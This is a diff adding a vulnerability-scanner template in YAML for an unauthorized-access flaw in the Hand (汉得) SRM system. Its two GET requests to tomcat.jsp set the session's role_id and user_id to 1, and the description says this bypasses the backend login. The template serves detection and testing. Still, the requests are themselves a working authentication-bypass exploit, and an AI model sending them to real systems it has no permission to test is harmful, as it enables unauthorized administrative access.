@@ -1,0 +1,33 @@
+id: srm-unauthaccess
+
+info:
+  name: 汉得SRM - 未授权访问
+  author: wintry
+  severity: high
+  description: 依次访问两个接口，然后访问后台可绕过登陆验证(但是需要修改密码).
+  tags: hdsrm
+  metadata:
+    max-request: 2
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/tomcat.jsp?dataName=role_id&dataValue=1"
+      - "{{BaseURL}}/tomcat.jsp?dataName=user_id&dataValue=1"
+
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_1, ".jvm1")'
+          - 'contains(body_2, "Session")'
+        condition: and
+
+      - type: word
+        words:
+          - 'validate_code'
+
+      - type: status
+        status:
+          - 200
